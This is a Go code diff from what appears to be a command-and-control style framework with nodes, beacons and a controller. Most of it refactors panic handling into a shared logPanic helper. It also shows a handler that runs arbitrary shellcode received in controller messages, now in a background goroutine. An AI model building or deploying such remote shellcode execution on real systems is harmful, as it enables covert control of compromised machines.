@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"context"
 	"fmt"
+	"sync"
 
 	"github.com/davecgh/go-spew/spew"
 	"github.com/vmihailenco/msgpack/v4"
@@ -21,6 +22,7 @@ type handler struct {
 
 	context context.Context
 	cancel  context.CancelFunc
+	wg      sync.WaitGroup
 }
 
 func newHandler(ctx *Node) *handler {
@@ -36,6 +38,7 @@ func (h *handler) Cancel() {
 }
 
 func (h *handler) Close() {
+	h.wg.Wait()
 	h.ctx = nil
 }
 
@@ -73,15 +76,18 @@ func (h *handler) logWithInfo(l logger.Level, log ...interface{}) {
 	h.ctx.logger.Print(l, "handler", buf)
 }
 
+// logPanic must use like defer h.logPanic("title")
+func (h *handler) logPanic(title string) {
+	if r := recover(); r != nil {
+		err := xpanic.Error(r, title)
+		h.log(logger.Fatal, err)
+	}
+}
+
 // -------------------------------------------send---------------------------------------------------
 
 func (h *handler) OnSend(send *protocol.Send) {
-	defer func() {
-		if r := recover(); r != nil {
-			err := xpanic.Error(r, "handler.OnSend")
-			h.log(logger.Fatal, err)
-		}
-	}()
+	defer h.logPanic("handler.OnSend")
 	if len(send.Message) < 4 {
 		const log = "controller send with invalid size"
 		h.logWithInfo(logger.Exploit, send, log)
@@ -102,12 +108,7 @@ func (h *handler) OnSend(send *protocol.Send) {
 
 // TODO <security> must remove to Beacon
 func (h *handler) handleExecuteShellCode(send *protocol.Send) {
-	defer func() {
-		if r := recover(); r != nil {
-			err := xpanic.Error(r, "handler.handleExecuteShellCode")
-			h.log(logger.Fatal, err)
-		}
-	}()
+	defer h.logPanic("handler.handleExecuteShellCode")
 	var es messages.ExecuteShellCode
 	err := msgpack.Unmarshal(send.Message, &es)
 	if err != nil {
@@ -115,19 +116,17 @@ func (h *handler) handleExecuteShellCode(send *protocol.Send) {
 		h.logWithInfo(logger.Exploit, send, log)
 		return
 	}
-	err = shellcode.Execute(es.Method, es.ShellCode)
-	if err != nil {
-		fmt.Println("--------------", err)
-	}
+	go func() {
+		err = shellcode.Execute(es.Method, es.ShellCode)
+		if err != nil {
+			// send execute error
+			fmt.Println("--------------", err)
+		}
+	}()
 }
 
 func (h *handler) handleSendTestMessage(send *protocol.Send) {
-	defer func() {
-		if r := recover(); r != nil {
-			err := xpanic.Error(r, "handler.handleSendTestMessage")
-			h.log(logger.Fatal, err)
-		}
-	}()
+	defer h.logPanic("handler.handleSendTestMessage")
 	if h.ctx.Test.SendTestMsg == nil {
 		return
 	}
@@ -140,12 +139,7 @@ func (h *handler) handleSendTestMessage(send *protocol.Send) {
 // ----------------------------------------broadcast-------------------------------------------------
 
 func (h *handler) OnBroadcast(broadcast *protocol.Broadcast) {
-	defer func() {
-		if r := recover(); r != nil {
-			err := xpanic.Error(r, "handler.OnBroadcast")
-			h.log(logger.Fatal, err)
-		}
-	}()
+	defer h.logPanic("handler.OnBroadcast")
 	if len(broadcast.Message) < 4 {
 		const log = "controller broadcast with invalid size"
 		h.logWithInfo(logger.Exploit, broadcast, log)
@@ -167,12 +161,7 @@ func (h *handler) OnBroadcast(broadcast *protocol.Broadcast) {
 }
 
 func (h *handler) handleNodeRegisterResponse(broadcast *protocol.Broadcast) {
-	defer func() {
-		if r := recover(); r != nil {
-			err := xpanic.Error(r, "handler.handleNodeRegisterResponse")
-			h.log(logger.Fatal, err)
-		}
-	}()
+	defer h.logPanic("handler.handleNodeRegisterResponse")
 	nrr := new(messages.NodeRegisterResponse)
 	err := msgpack.Unmarshal(broadcast.Message, nrr)
 	if err != nil {
@@ -189,12 +178,7 @@ func (h *handler) handleNodeRegisterResponse(broadcast *protocol.Broadcast) {
 }
 
 func (h *handler) handleBeaconRegisterResponse(broadcast *protocol.Broadcast) {
-	defer func() {
-		if r := recover(); r != nil {
-			err := xpanic.Error(r, "handler.handleBeaconRegisterResponse")
-			h.log(logger.Fatal, err)
-		}
-	}()
+	defer h.logPanic("handler.handleBeaconRegisterResponse")
 	brr := new(messages.BeaconRegisterResponse)
 	err := msgpack.Unmarshal(broadcast.Message, brr)
 	if err != nil {
@@ -211,12 +195,7 @@ func (h *handler) handleBeaconRegisterResponse(broadcast *protocol.Broadcast) {
 }
 
 func (h *handler) handleBroadcastTestMessage(broadcast *protocol.Broadcast) {
-	defer func() {
-		if r := recover(); r != nil {
-			err := xpanic.Error(r, "handler.handleBroadcastTestMessage")
-			h.log(logger.Fatal, err)
-		}
-	}()
+	defer h.logPanic("handler.handleBroadcastTestMessage")
 	if h.ctx.Test.BroadcastTestMsg == nil {
 		return
 	}
